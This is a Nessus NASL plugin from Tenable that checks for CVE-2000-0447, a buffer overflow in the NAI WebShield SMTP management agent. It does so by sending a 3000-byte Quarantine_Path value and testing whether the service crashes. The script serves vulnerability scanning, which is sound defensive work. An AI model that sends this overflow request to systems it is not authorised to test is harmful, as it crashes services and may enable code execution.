#
# (C) Tenable Network Security, Inc.
#

include( 'compat.inc' );

if(description)
{
  script_id(10425);
  script_version ("$Revision: 1.18 $");

  script_cve_id("CVE-2000-0447");
  script_bugtraq_id(1254);
  script_xref(name:"OSVDB", value:"327");

  script_name(english:"NAI WebShield SMTP Management Agent SET_CONFIG Overflow");
  script_summary(english:"Determines if the remote NAI WebShield SMTP Management trusts us");

  script_set_attribute(
    attribute:'synopsis',
    value:'The remote management service is prone to a buffer overflow.'
  );

  script_set_attribute(
    attribute:'description',
    value:
"The remote NAI WebShield SMTP Management tool
is vulnerable to a buffer overflow which allows
an attacker to gain execute arbitrary code
on this host when it is issued a too long argument
as a configuration parameter.

In addition to this, it allows an attacker to disable
the service at will.

* To re-enable the service :

  - execute regedit
  - edit the registry key 'Quarantine_Path' under
    HKLM\SOFTWARE\Network Associates\TVD\WebShield SMTP\MailScan
  - change its value from 'XXX...XXX' to the valid path to
    the quarantine folder.
  - restart the service"
  );

  script_set_attribute(
    attribute:'solution',
    value:
"Filter incoming traffic to this port. You may also restrict
the set of trusted hosts in the configuration console :
  - go to the 'server' section
  - select the 'trusted clients' tab
  - and set the data accordingly"
  );

  script_set_attribute(
    attribute:'cvss_vector',
    value:'CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P'
  );

  script_end_attributes();

 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_family(english:"Gain a shell remotely");
 script_dependencie("find_service1.nasl", "nai_webshield_info.nasl");
 script_require_ports(9999);
 script_require_keys("nai_webshield_management_agent/available");
 script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");

if (report_paranoia < 2) exit(0);

port = 9999;
if(get_port_state(port))
{
   soc = open_sock_tcp(port);
   if(soc)
   {
     req = string("GET_CONFIG\r\n");
     send(socket:soc, data:req);
     r = recv(socket:soc, length:2048);
     if ( ! r ) exit(0);
     close(soc);

     soc = open_sock_tcp(port);
     if ( ! soc ) exit(0);

     req = string("SET_CONFIG\r\nQuarantine_Path='", crap(3000), "'\r\n\r\n");
     send(socket:soc, data:req);
     r = recv(socket:soc, length:2048);
     if ( ! r ) exit(0);
     close(soc);
     sleep(2);

     soc2 = open_sock_tcp(port);
     if(!soc2)
     {
       security_hole(port);
     }
     else
     {
      req = string("GET_CONFIG\r\n");
      send(socket:soc2, data:req);
      r2 = recv(socket:soc2, length:1024);
      close(soc2);
      if(!r2)security_hole(port);
      }
   }
}
